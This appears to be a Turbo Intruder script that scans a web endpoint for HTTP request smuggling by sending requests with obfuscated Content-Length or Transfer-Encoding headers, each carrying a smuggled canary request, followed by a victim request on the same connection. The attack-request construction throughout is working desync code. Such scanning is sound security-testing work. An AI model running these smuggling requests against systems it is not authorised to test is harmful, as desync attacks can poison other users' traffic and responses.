# HTTP request smuggling / desync sweep across the DesyncTechniques obfuscation catalog
# (turbo.DesyncTechniques, turbo.DesyncCanary — read turbo_docs(action=get_docs, topic=desync-techniques)
# first). For each technique: builds an "attack" request whose Content-Length or Transfer-Encoding
# header is obfuscated, with a body carrying a smuggled follow-up request tagged with a canary;
# then a plain "victim" request on the SAME TCP connection (connectionId pins both to one socket,
# so the attack's would-be-smuggled bytes land on the connection right before the victim's own
# request). If a front-end/back-end disagree on where the attack request's body ends, the
# smuggled bytes get treated as the start of the NEXT request (or get prefixed onto the victim's),
# and the victim's response reflects it — which we detect by the canary leaking into that response.
#
# target.baseInput, if set, is a comma-separated technique list to run instead of the default set
# (e.g. "spacejoin1,0dspam,CL-dualCL" — see turbo.DesyncTechniques.allTechniques() for every name).

DEFAULT_TECHNIQUES = [
    'spacejoin1', 'nameprefix1', 'nameprefix2', 'valueprefix1', 'underjoin1', 'spjunk', 'backslash',
    'badsetupCR', 'badsetupLF', 'multiCase', 'UPPERCASE', '0dspam', '0dsuffix', 'tabsuffix',
    'commaCow', 'cowComma', 'contentEnc', 'quoted', 'aposed', 'nested', 'lazygrep', 'revdualchunk',
    'h1case', 'encode',
    'CL-dualCL', 'CL-plus', 'CL-minus', 'CL-pad', 'CL-bigpad', 'CL-spacepad', 'CL-e', 'CL-dec',
    'CL-commaprefix', 'CL-commasuffix', 'CL-expect', 'CL-expect-obfs',
]

# Techniques that only make sense against Content-Length (the rest target Transfer-Encoding).
CL_ONLY = set(t for t in DEFAULT_TECHNIQUES if t.startswith('CL-'))


def _desync_requests(host, technique, index):
    """Builds (attack_request, header_used) for one technique, or (None, None) if the technique
    had no effect on this request shape (DesyncTechniques.apply returned None for a CL technique)."""
    header = 'Content-Length' if technique in CL_ONLY else 'Transfer-Encoding'
    smuggled = turbo.DesyncCanary.injectIntoRequestLine('GET / HTTP/1.1\r\nX: Y\r\n\r\n', index, 1, 0)

    if header == 'Content-Length':
        body = smuggled
        attack = ('POST / HTTP/1.1\r\n'
                   'Host: ' + host + '\r\n'
                   'Content-Type: application/x-www-form-urlencoded\r\n'
                   'Connection: keep-alive\r\n'
                   'Content-Length: ' + str(len(body)) + '\r\n'
                   '\r\n' + body)
    else:
        # A zero-length terminal chunk, then the smuggled prefix: a back-end that correctly
        # parses "Transfer-Encoding: chunked" stops reading the body at "0\r\n\r\n" and treats
        # everything after it as the start of the next request on the connection; a front-end
        # that doesn't recognize the (obfuscated) header forwards the whole thing as one body.
        body = '0\r\n\r\n' + smuggled
        attack = ('POST / HTTP/1.1\r\n'
                   'Host: ' + host + '\r\n'
                   'Content-Type: application/x-www-form-urlencoded\r\n'
                   'Connection: keep-alive\r\n'
                   'Transfer-Encoding: chunked\r\n'
                   '\r\n' + body)

    mutated = turbo.DesyncTechniques.apply(attack, header, technique)
    return mutated, header


def queueRequests(target, wordlists):
    host = target.endpoint.replace('https://', '').replace('http://', '').split(':')[0].split('/')[0]

    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1,
                           engine=Engine.THREADED,
                           pipeline=True,
                           maxRetriesPerRequest=0,
                           )

    base_input = target.baseInput.strip() if hasattr(target, 'baseInput') and target.baseInput else ''
    techniques = [t.strip() for t in base_input.split(',') if t.strip()] if base_input else DEFAULT_TECHNIQUES

    victim = 'GET /?desync-victim HTTP/1.1\r\nHost: ' + host + '\r\nConnection: keep-alive\r\n\r\n'

    for i, technique in enumerate(techniques):
        mutated, header = _desync_requests(host, technique, i)
        if mutated is None:
            continue  # technique had no effect on Content-Length for this request shape

        # Same connectionId on both queue() calls pins them to one TCP connection — without this
        # the attack and victim are two unrelated requests on two unrelated connections and the
        # desync this script exists to test never gets a chance to happen.
        connectionId = 'desync-' + str(i)
        engine.queue(mutated, label=technique + '|attack|' + header, connectionId=connectionId, fixContentLength=False)
        engine.queue(victim, label=technique + '|victim', connectionId=connectionId)


def handleResponse(req, interesting):
    label = req.label or ''
    if '|victim' not in label:
        table.add(req)
        return

    technique = label.split('|')[0]
    canary = turbo.DesyncCanary.findCanary(req.response)
    if canary is not None:
        req.label = technique + ' CONFIRMED: desync (canary leaked into the victim response)'
        table.add(req)
        req.engine.cancel()
        return

    # A victim response that doesn't look like an ordinary one is still worth a manual look, even
    # without a canary hit (e.g. the smuggled request's own response landed on the victim's socket).
    if req.status not in (200, 301, 302, 303, 304, 404):
        req.label = technique + ' suspicious: unexpected victim status ' + str(req.status)
        table.add(req)
